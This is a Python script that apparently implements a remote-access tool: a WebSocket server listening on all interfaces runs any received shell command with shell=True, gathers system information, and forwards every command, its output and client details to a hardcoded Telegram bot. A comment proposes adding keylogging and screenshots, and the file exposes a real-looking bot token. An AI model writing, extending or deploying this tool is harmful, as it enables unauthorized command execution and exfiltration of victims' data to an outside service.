import asyncio
import websockets
import json
import os
import telebot
import subprocess
from datetime import datetime
from collections import deque

# Telegram Bot Configuration
BOT_TOKEN = '7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4'
CHAT_ID = '7416312733'
bot = telebot.TeleBot(BOT_TOKEN)

# Server Configuration
PORT = 10000
VALID_TOKENS = {"token123", "secureToken456", "clientABC789"}

# WebSocket Clients
clients = set()

# Command history
command_history = deque(maxlen=100)

# Authentication Process
def authenticate(client_socket):
    try:
        # Send an authentication request
        client_socket.send(json.dumps({"command": "auth", "result": "Please authenticate with your token."}))
        auth_message = client_socket.recv(1024)
        auth_data = json.loads(auth_message)
        if auth_data.get("command") == "auth" and auth_data.get("result") in VALID_TOKENS:
            return True
        return False
    except Exception as e:
        return False

# Execute shell commands and get output
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode()}"

# Send message to Telegram Bot
def send_to_telegram(message):
    bot.send_message(CHAT_ID, message)

# WebSocket Handler
async def handler(websocket, path):
    clients.add(websocket)
    print(f"Client connected: {websocket.remote_address}")

    if authenticate(websocket):
        await websocket.send(json.dumps({"command": "auth", "result": "Authentication successful."}))
        send_to_telegram(f"🟢 New client connected: {websocket.remote_address}")
        print(f"Client {websocket.remote_address} authenticated successfully.")

        async for message in websocket:
            data = json.loads(message)
            if data['command'] == 'exec':
                output = execute_command(data['result'])
                await websocket.send(json.dumps({"command": "output", "result": output, "timestamp": str(datetime.now())}))
                send_to_telegram(f"📩 Command executed on {websocket.remote_address}:\n{data['result']}\nOutput: {output}")
            elif data['command'] == 'data':
                # Collect data (e.g., system info, logs)
                # You can expand this with other types of data collection (keylogs, screenshots, etc.)
                system_info = subprocess.check_output("systeminfo", shell=True).decode()
                await websocket.send(json.dumps({"command": "data", "result": system_info, "timestamp": str(datetime.now())}))
                send_to_telegram(f"📩 Data from {websocket.remote_address}:\n{system_info}")
            else:
                await websocket.send(json.dumps({"command": "error", "result": "Unknown command"}))
    else:
        await websocket.send(json.dumps({"command": "auth", "result": "Authentication failed."}))
        send_to_telegram(f"❌ Client {websocket.remote_address} failed authentication.")

    clients.remove(websocket)
    print(f"Client disconnected: {websocket.remote_address}")

# Start WebSocket Server
async def start_server():
    server = await websockets.serve(handler, "0.0.0.0", PORT)
    await server.wait_closed()

# Run Telegram Bot
def run_bot():
    bot.polling()

if __name__ == "__main__":
    import threading

    # Run Telegram bot in a separate thread
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

    # Start WebSocket server
    asyncio.run(start_server())
